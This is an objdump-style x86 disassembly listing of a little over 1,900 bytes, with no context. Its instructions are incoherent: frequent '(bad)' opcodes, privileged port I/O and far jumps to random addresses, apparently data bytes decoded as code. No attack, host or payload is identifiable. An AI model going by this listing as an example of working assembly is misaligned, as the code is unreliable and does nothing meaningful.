  40b324:	push   esp
  40b325:	xchg   edx,eax
  40b326:	(bad)  
  40b327:	fs into 
  40b329:	imul   ecx,DWORD PTR ds:0x1bccb9be,0x76
  40b330:	adc    DWORD PTR [ebx],ecx
  40b332:	shl    DWORD PTR [ebx-0x5166dc41],0x82
  40b339:	addr16 xchg ebp,eax
  40b33b:	aam    0xb2
  40b33d:	adc    al,0xd7
  40b33f:	pop    edi
  40b340:	in     eax,0xab
  40b342:	call   0xc8ec:0x69dea1e3
  40b349:	cwde   
  40b34a:	loop   0x40b320
  40b34c:	and    al,0xa
  40b34e:	push   0x4600bff2
  40b353:	pop    esp
  40b354:	add    bl,dh
  40b356:	mov    ds:0x9abdc64e,eax
  40b35b:	mov    esi,0x612966f
  40b360:	mov    ebx,0x58a76c7f
  40b365:	push   DWORD PTR [ebp+0x7c]
  40b368:	ins    BYTE PTR es:[edi],dx
  40b369:	popf   
  40b36a:	bound  ecx,QWORD PTR [esi-0x1a257d44]
  40b370:	nop
  40b371:	stos   DWORD PTR es:[edi],eax
  40b372:	stos   DWORD PTR es:[edi],eax
  40b373:	ror    BYTE PTR [edx],0xc1
  40b376:	in     al,dx
  40b377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b378:	ins    DWORD PTR es:[edi],dx
  40b379:	arpl   WORD PTR [eax],sp
  40b37b:	mov    dl,0xe5
  40b37d:	pop    esi
  40b37e:	jmp    0x40b31c
  40b380:	mov    dl,0x86
  40b382:	mov    esp,0xa5ddd830
  40b387:	xor    DWORD PTR [ecx+0x8],ebp
  40b38a:	add    al,0xc4
  40b38c:	sub    eax,0x631f38d9
  40b391:	dec    esi
  40b392:	sub    DWORD PTR [edi+0x6d],0xb222eaeb
  40b399:	rcr    BYTE PTR [ebx-0x1cfafc61],cl
  40b39f:	push   eax
  40b3a0:	cmp    BYTE PTR [ebx],cl
  40b3a2:	cmp    al,0x3f
  40b3a4:	dec    esi
  40b3a5:	pop    ebp
  40b3a6:	inc    eax
  40b3a7:	cwde   
  40b3a8:	es push edi
  40b3aa:	mov    dh,0x95
  40b3ac:	cmc    
  40b3ad:	je     0x40b349
  40b3af:	cmp    al,0x5c
  40b3b1:	mov    edx,0x1418be50
  40b3b6:	call   0x91cc0edf
  40b3bb:	inc    ebp
  40b3bd:	adc    esi,DWORD PTR [edi-0x22524d7a]
  40b3c3:	stc    
  40b3c4:	cdq    
  40b3c5:	mov    al,ds:0xb83bd22
  40b3ca:	adc    ch,BYTE PTR [esi+0x30]
  40b3cd:	jne    0x40b3b9
  40b3cf:	cld    
  40b3d0:	push   ecx
  40b3d1:	shr    edi,0x91
  40b3d4:	mov    dl,0xa2
  40b3d6:	adc    dh,bl
  40b3d8:	xchg   ebx,eax
  40b3d9:	dec    edx
  40b3da:	jl     0x40b419
  40b3dc:	mov    ds:0xcdce8d15,eax
  40b3e1:	dec    esp
  40b3e2:	aaa    
  40b3e3:	inc    esi
  40b3e4:	loope  0x40b3d1
  40b3e6:	mov    al,ds:0x9a4fdc73
  40b3eb:	push   esp
  40b3ec:	loopne 0x40b3c7
  40b3ee:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40b3f0:	push   es
  40b3f1:	fwait
  40b3f2:	out    0xa7,al
  40b3f4:	push   esi
  40b3f5:	cli    
  40b3f6:	cmp    cl,BYTE PTR [edx-0x7d]
  40b3f9:	imul   esp,DWORD PTR [edx-0x23d44ac7],0x58
  40b400:	inc    ch
  40b402:	jmp    0x1fdc9642
  40b407:	push   esi
  40b408:	push   esi
  40b409:	or     esi,DWORD PTR [edx+edx*1-0x29]
  40b40d:	retf   0x3015
  40b410:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b411:	int    0x9b
  40b413:	out    dx,eax
  40b414:	adc    cl,BYTE PTR [ecx-0x45]
  40b417:	repz cs call 0xa72f:0x259b72da
  40b420:	xchg   ecx,eax
  40b421:	fild   QWORD PTR [edi+0x6c]
  40b424:	pop    ds
  40b425:	sar    BYTE PTR [bp+0x26b2],cl
  40b42a:	fs repnz mov ebx,0xb127d8c2
  40b431:	pop    ds
  40b432:	adc    eax,0x9add9e63
  40b437:	xlat   BYTE PTR ds:[ebx]
  40b438:	imul   esi,DWORD PTR [esi],0xfffffffb
  40b43b:	xchg   edx,eax
  40b43c:	pop    esi
  40b43d:	sbb    DWORD PTR [ecx-0x4871142e],0xe79bd971
  40b447:	outs   dx,BYTE PTR ds:[esi]
  40b448:	popf   
  40b449:	adc    al,0x3b
  40b44b:	mov    ebx,0x7df404a2
  40b450:	pop    DWORD PTR [ecx+0x0]
  40b453:	pop    ebp
  40b454:	pop    edx
  40b455:	xor    eax,0x3dc9f59a
  40b45a:	das    
  40b45b:	xor    al,0x2c
  40b45d:	push   0xffffff9a
  40b45f:	mov    cs,WORD PTR [ecx-0x59]
  40b462:	dec    bl
  40b464:	cmp    eax,DWORD PTR [edi-0x26d58ee]
  40b46a:	loop   0x40b43e
  40b46c:	mov    dh,0xbe
  40b46e:	xor    ch,bh
  40b470:	mov    dl,0x85
  40b472:	test   al,0xc1
  40b474:	retf   
  40b475:	add    bh,BYTE PTR [esi+edx*2-0x6d]
  40b479:	or     edx,DWORD PTR [ebx]
  40b47b:	sbb    BYTE PTR [edx],al
  40b47d:	and    eax,DWORD PTR [ecx]
  40b47f:	sub    eax,0x269931a1
  40b484:	mov    dl,dh
  40b486:	jle    0x40b40d
  40b488:	(bad)  
  40b489:	sti    
  40b48a:	in     eax,dx
  40b48b:	aam    0x35
  40b48d:	or     ebp,DWORD PTR [edx-0x38bac8a6]
  40b493:	data16 sub BYTE PTR [eax-0x5f],ch
  40b497:	fnstsw WORD PTR [eax+0x415810b]
  40b49d:	fnsave [ebx-0x76f41e9f]
  40b4a3:	jmp    0x32c7c8f6
  40b4a8:	lahf   
  40b4a9:	dec    esi
  40b4aa:	cdq    
  40b4ab:	test   al,0xdb
  40b4ad:	retf   0xb9a3
  40b4b0:	sub    eax,eax
  40b4b2:	clc    
  40b4b3:	push   edi
  40b4b4:	popf   
  40b4b5:	jnp    0x40b4a6
  40b4b7:	shl    ecx,cl
  40b4b9:	or     eax,DWORD PTR [edi-0x21]
  40b4bc:	jmp    0xa0d0:0x1757f12d
  40b4c3:	or     bh,0x82
  40b4c6:	lds    edi,FWORD PTR [ecx+0x7269eb1a]
  40b4cc:	adc    BYTE PTR [esi+ebx*4],dl
  40b4cf:	cmp    BYTE PTR [ebp-0x3103d835],ah
  40b4d5:	lahf   
  40b4d6:	xor    al,0x16
  40b4d8:	lods   eax,DWORD PTR ds:[esi]
  40b4d9:	out    dx,eax
  40b4da:	push   ecx
  40b4db:	jecxz  0x40b4cb
  40b4dd:	xchg   ecx,eax
  40b4de:	call   0x7344:0x6ad16d90
  40b4e5:	push   ss
  40b4e6:	int3   
  40b4e7:	mov    dl,0x8b
  40b4e9:	dec    ebx
  40b4ea:	xor    esi,edx
  40b4ec:	out    0xad,eax
  40b4ee:	cdq    
  40b4ef:	or     eax,0x54d323b2
  40b4f4:	scas   eax,DWORD PTR es:[edi]
  40b4f5:	or     DWORD PTR [edx+0x1d],esi
  40b4f8:	mov    ecx,0x1af9a202
  40b4fd:	repnz out 0x24,eax
  40b500:	ja     0x40b561
  40b502:	xor    DWORD PTR [edi+0x527abaac],esp
  40b508:	hlt    
  40b509:	mov    ah,0xbd
  40b50b:	call   0x77f2:0xafa1ffae
  40b512:	inc    esi
  40b513:	fwait
  40b514:	add    al,0x29
  40b516:	loop   0x40b4bf
  40b518:	fisttp QWORD PTR [ecx]
  40b51a:	cld    
  40b51b:	jmp    0x40b52b
  40b51d:	dec    eax
  40b51e:	push   ebx
  40b51f:	mov    gs,WORD PTR [ebx+edi*8-0x1e0d3251]
  40b526:	mov    eax,ds:0x9b638b2b
  40b52b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b52c:	bound  ebx,QWORD PTR [edx*1+0x7acf9a70]
  40b533:	push   cs
  40b534:	mov    ebp,0xf07f439e
  40b539:	mov    ebx,DWORD PTR [ebp+0x139af558]
  40b53f:	test   al,0xfd
  40b541:	dec    eax
  40b542:	or     al,BYTE PTR [ebp-0x69068f8e]
  40b548:	mov    bl,0xd0
  40b54a:	cwde   
  40b54b:	div    BYTE PTR [esi+0x73]
  40b54e:	and    BYTE PTR cs:[edi-0x15],dl
  40b552:	into   
  40b553:	pop    esi
  40b554:	das    
  40b555:	or     edi,DWORD PTR [edi]
  40b557:	je     0x40b50a
  40b559:	push   es
  40b55a:	xchg   DWORD PTR [edi+esi*8],ecx
  40b55d:	loop   0x40b4f9
  40b55f:	out    0xea,eax
  40b561:	addr16 pop esp
  40b563:	repz jmp 0x41e12a39
  40b569:	es (bad) 
  40b56d:	fmul   QWORD PTR [edi]
  40b56f:	idiv   BYTE PTR [ecx+0x5b]
  40b572:	dec    ebp
  40b573:	dec    edi
  40b574:	adc    ch,BYTE PTR [edi]
  40b576:	call   0x50c:0x635e4443
  40b57d:	pop    edx
  40b57e:	sbb    BYTE PTR [edi-0x79c64a5b],ah
  40b584:	shr    DWORD PTR [ebp-0x2d4d718c],1
  40b58a:	std    
  40b58b:	pusha  
  40b58c:	jg     0x40b510
  40b58e:	and    BYTE PTR [edi],bh
  40b590:	mov    bh,BYTE PTR [esi-0x2a]
  40b593:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b594:	lods   eax,DWORD PTR ds:[esi]
  40b595:	outs   dx,DWORD PTR ds:[esi]
  40b596:	scas   eax,DWORD PTR es:[edi]
  40b597:	sub    ebx,DWORD PTR [ecx+0x76]
  40b59a:	or     edx,DWORD PTR [ebp*4+0x3221ff2b]
  40b5a1:	jnp    0x40b5db
  40b5a3:	rol    DWORD PTR [ecx+0x71a7c08b],cl
  40b5a9:	out    0xef,al
  40b5ab:	sbb    dl,al
  40b5ad:	pop    esp
  40b5ae:	dec    ebx
  40b5af:	sub    esi,DWORD PTR [edx-0x1716ec4]
  40b5b5:	jns    0x40b5dc
  40b5b7:	outs   dx,BYTE PTR ds:[esi]
  40b5b8:	inc    ebx
  40b5b9:	jge    0x40b5ac
  40b5bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5bc:	push   ebx
  40b5bd:	sbb    dl,BYTE PTR [ebx+eiz*8-0x9]
  40b5c1:	or     BYTE PTR [eax],0xba
  40b5c4:	mov    dl,0x9c
  40b5c6:	and    BYTE PTR [ebx],cl
  40b5c8:	mov    ah,0xdb
  40b5ca:	mov    bl,0xb0
  40b5cc:	sti    
  40b5cd:	or     ecx,DWORD PTR [ecx+esi*1+0x35]
  40b5d1:	int    0xeb
  40b5d3:	add    al,0xc6
  40b5d5:	imul   ebx,DWORD PTR [edx-0x7acb8e07],0xdfbe8f6f
  40b5df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5e0:	das    
  40b5e1:	push   ebx
  40b5e2:	xor    ch,BYTE PTR [eax]
  40b5e4:	xor    DWORD PTR [ebp-0x1d],eax
  40b5e7:	out    0x6,eax
  40b5e9:	sub    al,0xfa
  40b5eb:	dec    ebp
  40b5ec:	mov    dl,0xf1
  40b5ee:	(bad)
  40b5f2:	inc    edi
  40b5f3:	inc    esi
  40b5f4:	jmp    0xfc9e:0xcb01590b
  40b5fb:	jecxz  0x40b5ec
  40b5fd:	inc    eax
  40b5fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5ff:	mov    ebp,esp
  40b601:	test   esi,edi
  40b603:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b604:	xchg   ebx,eax
  40b605:	or     edi,DWORD PTR [esi-0x6e]
  40b608:	sbb    al,0xe9
  40b60a:	mov    BYTE PTR [edi+0x35c44815],ah
  40b610:	dec    esp
  40b611:	mov    gs,WORD PTR [edx]
  40b613:	retf   0x25bc
  40b616:	test   DWORD PTR [ebx-0x20],ebx
  40b619:	jne    0x40b630
  40b61b:	mov    cl,0xb6
  40b61d:	imul   ebx,DWORD PTR [ebx+0x14d99750],0xffffff98
  40b624:	clc    
  40b625:	cmp    ebx,DWORD PTR [edx]
  40b627:	sbb    DWORD PTR [edi+eiz*2],esi
  40b62a:	jbe    0x40b622
  40b62c:	pop    es
  40b62d:	call   0x377ac1cd
  40b632:	inc    ebp
  40b633:	adc    esi,DWORD PTR [ebp+0x29fa768a]
  40b639:	or     edi,DWORD PTR [esi]
  40b63b:	(bad)  
  40b63c:	sub    eax,0x7d9e9116
  40b641:	stc    
  40b642:	call   0xb64f:0x18f4014c
  40b649:	jne    0x40b616
  40b64b:	mov    ecx,0x19db67e4
  40b650:	mov    dl,0x7c
  40b652:	in     eax,0x3d
  40b654:	xor    esp,ebp
  40b656:	stc    
  40b657:	outs   dx,BYTE PTR ds:[esi]
  40b658:	scas   al,BYTE PTR es:[edi]
  40b659:	xchg   ebx,eax
  40b65a:	gs nop
  40b65c:	jne    0x40b6a2
  40b65e:	jo     0x40b66b
  40b660:	dec    ebx
  40b661:	or     edi,edi
  40b663:	loope  0x40b685
  40b665:	xchg   edi,eax
  40b666:	xchg   ebp,eax
  40b667:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b668:	xchg   esp,eax
  40b669:	rcl    BYTE PTR [ebp+ebx*8+0x6373d6c4],cl
  40b670:	mov    al,0xb4
  40b672:	cmp    DWORD PTR ds:0x660857d5,ebp
  40b678:	xor    ch,bh
  40b67a:	jmp    0x1d84:0xb50bebab
  40b681:	hlt    
  40b682:	not    DWORD PTR [esi-0x6b6557d4]
  40b688:	retf   
  40b689:	(bad)  
  40b68a:	push   ds
  40b68b:	scas   eax,DWORD PTR es:[edi]
  40b68c:	sbb    ecx,eax
  40b68e:	and    esp,DWORD PTR [edi-0x5d09f30a]
  40b694:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b695:	cmp    eax,DWORD PTR ds:0x678ab2c6
  40b69b:	ja     0x40b69e
  40b69d:	mov    edx,0x36394017
  40b6a2:	add    bl,bl
  40b6a4:	mov    ecx,0xb2570f5a
  40b6a9:	xchg   esi,eax
  40b6aa:	mov    al,0x4f
  40b6ac:	popa   
  40b6ad:	call   0x38f2f524
  40b6b2:	pushf  
  40b6b3:	dec    ebp
  40b6b4:	and    ebp,DWORD PTR [edi]
  40b6b6:	cld    
  40b6b7:	push   esi
  40b6b8:	fnsave [esi]
  40b6ba:	dec    eax
  40b6bb:	repz xor DWORD PTR [ecx-0x5b],esi
  40b6bf:	clc    
  40b6c0:	jmp    0xb4f6:0x207e2acb
  40b6c7:	lock mov bh,0x52
  40b6ca:	call   0x947b:0xc9ae3cac
  40b6d1:	or     ebp,DWORD PTR [esi-0x66]
  40b6d4:	iret   
  40b6d5:	mov    eax,0x1851372c
  40b6da:	mov    al,ds:0x970b6332
  40b6df:	and    eax,0x7cb034b8
  40b6e4:	enter  0x5a0b,0x2e
  40b6e8:	out    dx,eax
  40b6e9:	jle    0x40b725
  40b6eb:	popa   
  40b6ec:	popa   
  40b6ed:	mov    bl,BYTE PTR [edx+0x4f376d6b]
  40b6f3:	enter  0x20bc,0x57
  40b6f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6f8:	jo     0x40b6a6
  40b6fa:	(bad)  
  40b6fb:	jo     0x40b73e
  40b6fd:	add    cl,bh
  40b6ff:	cmp    DWORD PTR [edx],ebp
  40b701:	test   DWORD PTR [eax-0x6541ac91],0x5e28d30c
  40b70b:	icebp  
  40b70c:	aam    0xb
  40b70e:	and    esi,DWORD PTR [ecx]
  40b710:	(bad)  [ebx-0x5ea2cb8e]
  40b716:	call   0xbb11:0x955c6c85
  40b71d:	rcl    BYTE PTR [eax-0x7dfafde1],0x17
  40b724:	adc    edx,DWORD PTR [esi-0x6]
  40b727:	shl    DWORD PTR [edi+0x53],0x5f
  40b72b:	cmp    al,0xb2
  40b72d:	mov    ecx,0x33e5023e
  40b732:	and    ch,dh
  40b734:	fisttp WORD PTR [edx]
  40b736:	mov    dh,0xec
  40b738:	push   eax
  40b739:	ret    0xe681
  40b73c:	test   DWORD PTR [ebx+0x72],ebp
  40b73f:	xchg   edx,eax
  40b740:	lods   al,BYTE PTR ds:[esi]
  40b741:	push   cs
  40b742:	dec    edx
  40b743:	popa   
  40b744:	jb     0x40b76e
  40b746:	push   0xffffffde
  40b748:	mov    ebp,0xafa9bd9d
  40b74d:	jl     0x40b720
  40b74f:	dec    ebx
  40b750:	xchg   edx,eax
  40b751:	stos   DWORD PTR es:[edi],eax
  40b752:	lods   al,BYTE PTR ds:[esi]
  40b753:	(bad)  
  40b754:	shl    bl,cl
  40b756:	xchg   ebp,eax
  40b757:	mov    WORD PTR [ecx+0x3],fs
  40b75a:	adc    al,BYTE PTR [edi+0x7ed75014]
  40b760:	repnz mov ebx,0x37ada736
  40b766:	in     al,0xa1
  40b768:	and    BYTE PTR [ebp+0x7bc585f8],bh
  40b76e:	fwait
  40b76f:	adc    eax,ecx
  40b771:	pop    edi
  40b772:	xor    BYTE PTR [ebp+0xc7f1794],0x71
  40b779:	scas   al,BYTE PTR es:[edi]
  40b77a:	call   0x81eb:0xafa50e30
  40b781:	or     BYTE PTR [edx],bh
  40b783:	and    eax,0xdd48ca8c
  40b788:	push   edx
  40b789:	xchg   ecx,eax
  40b78a:	cmp    edi,DWORD PTR [edi-0x4e]
  40b78d:	mov    eax,ds:0x6ec2e77c
  40b792:	mov    eax,ds:0x36170f8d
  40b797:	inc    ebx
  40b798:	xor    DWORD PTR [ebx+0x21],ecx
  40b79b:	jmp    0x9fae:0x2c2f2d29
  40b7a2:	mov    eax,0x902abda3
  40b7a7:	inc    edi
  40b7a8:	mov    al,ds:0x709b8d41
  40b7ad:	jge    0x40b804
  40b7af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7b0:	loop   0x40b7d8
  40b7b2:	mov    esp,DWORD PTR ds:0x31c00823
  40b7b8:	mov    DWORD PTR [edi-0x61],edi
  40b7bb:	daa    
  40b7bc:	adc    BYTE PTR [edx+0x71],0x8d
  40b7c0:	push   eax
  40b7c1:	jp     0x40b767
  40b7c3:	test   al,0x99
  40b7c5:	sub    esp,eax
  40b7c7:	rcl    BYTE PTR gs:[ebx+0x73],cl
  40b7cb:	pop    es
  40b7cc:	or     ebx,DWORD PTR [ebp-0x66]
  40b7cf:	and    DWORD PTR [ebx+ebx*4+0x51],esp
  40b7d3:	mov    BYTE PTR [eax-0x56],cl
  40b7d6:	push   ds
  40b7d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7d8:	test   DWORD PTR [esi+0xcedf3e7],ebx
  40b7de:	inc    edx
  40b7df:	std    
  40b7e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7e1:	or     DWORD PTR [esp+edi*4+0x6cd1fa9c],edx
  40b7e8:	mov    esp,0xd26e58b
  40b7ed:	pop    DWORD PTR [edx+0x3ecde7a7]
  40b7f3:	jmp    0x40b787
  40b7f5:	ficomp WORD PTR [ecx+ebp*8-0x4c8da44e]
  40b7fc:	push   es
  40b7fd:	jns    0x40b7ed
  40b7ff:	jnp    0x40b873
  40b801:	std    
  40b802:	sahf   
  40b803:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b804:	sbb    cl,BYTE PTR [ebx+0x36699e22]
  40b80a:	or     DWORD PTR [ecx],eax
  40b80c:	mov    ecx,0xcc6fb9b1
  40b811:	or     al,0x1
  40b813:	push   ecx
  40b814:	mov    ds:0x2f99a8d8,al
  40b819:	or     ebx,ecx
  40b81b:	ins    DWORD PTR es:[edi],dx
  40b81c:	dec    esi
  40b81d:	jge    0x40b7fc
  40b81f:	call   0x73b2:0xb57ab81a
  40b826:	ror    BYTE PTR [edx+0x7f08301f],1
  40b82c:	(bad)  [ebx]
  40b82e:	pop    es
  40b82f:	cmp    BYTE PTR [ecx+0x40b29b65],al
  40b835:	and    ebx,DWORD PTR [edx-0x46fe503e]
  40b83b:	pop    ds
  40b83c:	jno    0x40b845
  40b83e:	mov    ebp,0xdfd1b4a5
  40b843:	adc    eax,0xe5dacb2b
  40b848:	adc    al,0x27
  40b84a:	call   0xb3ed:0x8da3ee5c
  40b851:	dec    ecx
  40b852:	popf   
  40b853:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b854:	dec    esp
  40b855:	xor    esp,DWORD PTR [ebp-0x56e26cd1]
  40b85b:	ret    0x80b2
  40b85e:	nop
  40b85f:	push   ds
  40b860:	enter  0xaed0,0xf2
  40b864:	push   edi
  40b865:	or     eax,DWORD PTR [ebx]
  40b867:	outs   dx,BYTE PTR ds:[esi]
  40b868:	je     0x40b860
  40b86a:	subps  xmm6,XMMWORD PTR ds:0xe8f9ae8
  40b871:	push   cs
  40b872:	outs   dx,BYTE PTR ds:[esi]
  40b873:	sub    al,0xcc
  40b875:	push   eax
  40b876:	(bad)  
  40b877:	mov    ecx,ebp
  40b879:	inc    esi
  40b87a:	aam    0xa7
  40b87c:	adc    eax,0xc7d1cd59
  40b881:	xor    al,0x9a
  40b883:	jl     0x40b8b3
  40b885:	mov    WORD PTR ds:[esi],ss
  40b888:	out    0xa5,al
  40b88a:	adc    DWORD PTR [edi+0x560fe014],esp
  40b890:	pop    edi
  40b891:	jno    0x40b8ce
  40b893:	push   ds
  40b894:	mov    dl,0xf4
  40b896:	push   edx
  40b897:	gs out 0xf0,eax
  40b89a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b89b:	push   edx
  40b89c:	dec    eax
  40b89d:	or     eax,DWORD PTR [eax+0xc0f5d67]
  40b8a3:	add    BYTE PTR [ebx-0x74],ch
  40b8a6:	call   0x7eca:0x4035a5a6
  40b8ad:	leave  
  40b8ae:	loop   0x40b882
  40b8b0:	sub    eax,0x2b54b80b
  40b8b5:	stos   DWORD PTR es:[edi],eax
  40b8b6:	jp     0x40b8a0
  40b8b8:	inc    edi
  40b8b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8ba:	xchg   ebp,eax
  40b8bb:	rcr    BYTE PTR [ecx-0x18780b7a],1
  40b8c1:	scas   eax,DWORD PTR es:[edi]
  40b8c2:	in     al,0xe2
  40b8c4:	bound  ecx,QWORD PTR [ebx]
  40b8c6:	dec    esi
  40b8c7:	xchg   ebx,eax
  40b8c8:	ss call 0xa85bdda8
  40b8ce:	push   0x40aab416
  40b8d3:	daa    
  40b8d4:	addr16 dec ecx
  40b8d6:	mov    eax,0x9e5beaa6
  40b8db:	jmp    0xd544:0x2729fd87
  40b8e2:	mov    ecx,0x10111f98
  40b8e7:	cwde   
  40b8e8:	push   eax
  40b8e9:	adc    bl,BYTE PTR [edx]
  40b8eb:	daa    
  40b8ec:	jl     0x40b914
  40b8ee:	jg     0x40b94b
  40b8f0:	mov    ebp,DWORD PTR [edx-0x7c]
  40b8f3:	and    eax,0xb41abd83
  40b8f8:	sbb    DWORD PTR [ecx-0x6],ecx
  40b8fb:	sub    edi,DWORD PTR [edi-0x19]
  40b8fe:	cmp    ah,BYTE PTR [edi-0x54faed7b]
  40b904:	nop
  40b905:	std    
  40b906:	mov    edi,0x698db2e8
  40b90b:	push   eax
  40b90c:	mov    WORD PTR [ecx+0x7fe4b565],gs
  40b912:	adc    ah,BYTE PTR [eax-0x289fd0ce]
  40b918:	xchg   DWORD PTR [ebx],ebx
  40b91a:	fcmovu st,st(1)
  40b91c:	fwait
  40b91d:	push   0x15194999
  40b922:	ss pop esp
  40b924:	sbb    eax,0xcbcb62eb
  40b929:	or     ebp,DWORD PTR [ebx+0x55107f61]
  40b92f:	cmp    bl,BYTE PTR [edi]
  40b931:	pop    ebx
  40b932:	call   0x46fb:0x2eea3206
  40b939:	mov    BYTE PTR [ecx-0x4c],ch
  40b93c:	add    eax,0x99a0cceb
  40b941:	add    DWORD PTR [edi+eiz*1+0x41725e59],ecx
  40b948:	mov    dl,0x1a
  40b94a:	rol    BYTE PTR [esi+ebp*2],cl
  40b94d:	out    0x2c,al
  40b94f:	in     eax,dx
  40b950:	fmul   DWORD PTR [edx]
  40b952:	dec    eax
  40b953:	in     eax,0xfe
  40b955:	shl    esp,cl
  40b957:	jmp    0x3f8a84c1
  40b95c:	mov    dl,0x15
  40b95e:	ds pop esp
  40b960:	sbb    DWORD PTR [esi],ebx
  40b962:	repnz fisubr DWORD PTR [edx+esi*1+0x2e]
  40b967:	pusha  
  40b968:	mov    BYTE PTR [esi+0x78393d9b],ch
  40b96e:	jne    0x40b96f
  40b970:	popa   
  40b971:	je     0x40b9ed
  40b973:	xor    DWORD PTR [edi-0x4b519f8],ebp
  40b979:	xor    BYTE PTR [esi-0x4e],dl
  40b97c:	lods   al,BYTE PTR ds:[esi]
  40b97d:	jge    0x40b95f
  40b97f:	sub    esi,DWORD PTR [edx-0x78f9f5cd]
  40b985:	nop
  40b986:	das    
  40b987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b988:	pusha  
  40b989:	rol    BYTE PTR [eax+0x1d8fc7ea],cl
  40b98f:	cmp    dh,BYTE PTR [ebx+0x207b20d1]
  40b995:	repnz test eax,0xf45ab8
  40b99b:	pushf  
  40b99c:	int    0xa7
  40b99e:	sbb    al,BYTE PTR [edx+0x5c97a81f]
  40b9a4:	(bad)  
  40b9a5:	jmp    0x40b940
  40b9a7:	arpl   WORD PTR [edi-0x1b],di
  40b9aa:	imul   DWORD PTR [eax+ebp*4-0x69374df5]
  40b9b1:	push   eax
  40b9b2:	xlat   BYTE PTR es:[ebx]
  40b9b4:	add    eax,0x75c9a52
  40b9b9:	nop
  40b9ba:	xor    esp,esi
  40b9bc:	jno    0x40b988
  40b9be:	sbb    ah,BYTE PTR [esi+0x15b4801d]
  40b9c4:	jp     0x40b9c7
  40b9c6:	lea    ebp,[ebx+0x66]
  40b9c9:	(bad)  
  40b9ca:	call   0xc3b4:0x27552e1e
  40b9d1:	inc    esp
  40b9d2:	cmp    ah,BYTE PTR [esp+ebx*4+0x1d887833]
  40b9d9:	jns    0x40ba2d
  40b9db:	ds jo  0x40b985
  40b9de:	call   0xd10c:0x1d73684b
  40b9e5:	pop    ecx
  40b9e6:	out    dx,eax
  40b9e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9e8:	rcl    DWORD PTR [esi-0x5cdd3c36],0xb
  40b9ef:	add    al,0xa1
  40b9f1:	into   
  40b9f2:	mov    ds:0x3e0b1888,eax
  40b9f7:	push   0x74c92a6d
  40b9fc:	mov    dl,0x73
  40b9fe:	imul   eax,DWORD PTR [edx+0x2e1edeba],0xfffffff9
  40ba05:	adc    eax,0xcb860562
  40ba0a:	rcr    BYTE PTR [eax],0x9e
  40ba0d:	imul   esp,DWORD PTR [ebp-0x5f],0xa9f9cdb2
  40ba14:	test   DWORD PTR [edi+0xb268f3c],0xb6667583
  40ba1e:	mov    ecx,0xd684e49e
  40ba23:	jbe    0x40ba5e
  40ba25:	or     ecx,DWORD PTR [edx-0x47]
  40ba28:	cli    
  40ba29:	push   es
  40ba2a:	xchg   ebp,eax
  40ba2b:	ss enter 0x680b,0x88
  40ba30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba31:	pop    ecx
  40ba32:	sub    esi,DWORD PTR [edi]
  40ba34:	jb     0x40ba45
  40ba36:	call   0xee86:0x663958c8
  40ba3d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba3e:	popf   
  40ba3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba40:	and    eax,0xb877a912
  40ba45:	into   
  40ba46:	pop    edx
  40ba47:	les    ebx,FWORD PTR [eax]
  40ba49:	setge  BYTE PTR [edi+0x13]
  40ba4d:	xor    DWORD PTR [ecx-0x5],ebx
  40ba50:	loop   0x40baae
  40ba52:	or     edi,DWORD PTR [ecx+0x1e870b17]
  40ba58:	pop    esi
  40ba59:	sbb    BYTE PTR [edx+0x12],bl
  40ba5c:	fstp   DWORD PTR [ebx+0x1f6e8a87]
  40ba62:	pop    edx
  40ba63:	mov    cl,0xed
  40ba65:	imul   edx,edi,0x16
  40ba68:	xchg   esp,eax
  40ba69:	or     ebp,DWORD PTR [esi+0x20a12fc6]
  40ba6f:	pushf  
  40ba70:	scas   al,BYTE PTR es:[edi]
  40ba71:	inc    ebp
  40ba72:	call   0xc445:0x2713fd90
  40ba79:	adc    eax,0xcf841dc
  40ba7e:	mov    BYTE PTR [ebp-0x7f],ah
  40ba81:	dec    eax
  40ba82:	add    eax,0x1891c756
  40ba87:	xchg   DWORD PTR [edi+edx*8-0x66],ecx
  40ba8b:	fcom   QWORD PTR [ecx]
  40ba8d:	test   ecx,0xe9392a59
  40ba93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ba94:	sub    eax,0x5cdf0849
  40ba99:	imul   eax,DWORD PTR cs:[edi-0x4b],0x1a3bbd56
  40baa1:	fwait
  40baa2:	sbb    DWORD PTR [esp+eiz*8-0x3f88e620],esp
  40baa9:	ja     0x40baa8
  40baab:	mov    al,ds:0x54de5eb6
  40bab0:	push   ecx
  40bab1:	retf   
  40bab2:	cmp    eax,0x9a755c99
  40bab7:	cmp    dl,BYTE PTR [edi-0x4e24d3b9]
  40babd:	out    dx,eax
  40babe:	ret    0x1ca7
  40bac1:	xor    ah,cl
  40bac3:	arpl   si,si
  40bac5:	pop    esp
  40bac6:	sub    esi,DWORD PTR [eax+0x41fda9b2]
  40bacc:	jle    0x40baf1
  40bace:	inc    esi
  40bacf:	mov    esp,0xa7777741
  40bad4:	mov    ecx,0xd665a2d5
  40bad9:	or     DWORD PTR [esi],edx
  40badb:	jno    0x40baa3
